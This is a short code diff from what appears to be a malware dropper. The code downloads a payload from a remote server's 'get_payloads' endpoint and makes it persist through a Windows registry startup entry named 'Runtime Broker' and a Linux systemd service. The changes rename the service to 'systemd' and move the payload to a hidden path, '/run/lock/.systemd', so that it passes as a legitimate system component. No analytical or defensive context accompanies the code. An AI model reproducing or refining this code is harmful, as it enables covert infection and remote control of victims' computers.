@@ -32,7 +32,7 @@ def run(url, file_path):
         # Write service file
         with open(service_file, 'w') as f:
             f.write(f"""[Unit]
-    Description=My Python Service
+    Description=systemd
     After=network-online.target
     Wants=network-online.target
 
@@ -138,14 +138,13 @@ def run(url, file_path):
         add_registry_startup(file_path, "Runtime Broker")
     
     elif os_type == 'Linux' or os_type == 'FreeBSD' or os_type == 'OpenBSD' or os_type == 'SunOS' or os_type == 'Android':
-        file_path = "/run/lock/mail2"
+        file_path = "/run/lock/.systemd"
         if not os.path.exists(file_path):
             subprocess.run(f'touch {file_path}', shell=True)
             response = requests.get(f"{url}get_payloads/{download_path}")
             with open(file_path, 'wb') as file:
               file.write(response.content)
         # Create a hidden file and add a crontab job
-        create_hidden_file(file_path)
         create_systemd_service(file_path)
         #add_crontab_job(file_path)
     
